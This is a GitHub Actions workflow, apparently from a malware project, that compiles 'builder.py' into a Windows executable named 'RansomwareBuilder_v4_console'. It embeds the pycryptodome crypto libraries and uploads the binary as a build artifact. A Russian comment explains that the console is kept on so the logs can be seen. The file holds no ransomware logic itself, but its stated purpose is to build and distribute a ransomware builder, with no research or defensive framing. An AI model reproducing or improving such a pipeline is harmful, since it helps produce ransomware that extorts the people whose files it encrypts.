name: Build Ransomware Builder v4.0 (with console)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
      
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
        
    - name: Install dependencies
      run: |
        pip install pyinstaller pycryptodome pillow
        
    - name: Build Builder with ALL dependencies embedded (CONSOLE VERSION)
      run: |
        # УБИРАЕМ --noconsole, ЧТОБЫ ВИДЕТЬ ЛОГИ!
        pyinstaller --onefile --name "RansomwareBuilder_v4_console" `
          --hidden-import PyInstaller `
          --hidden-import Crypto `
          --hidden-import Crypto.Cipher `
          --hidden-import Crypto.PublicKey `
          --hidden-import Crypto.Util `
          --collect-all Crypto `
          --collect-all pycryptodome `
          builder.py
        
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v4_console
        path: dist/RansomwareBuilder_v4_console.exe
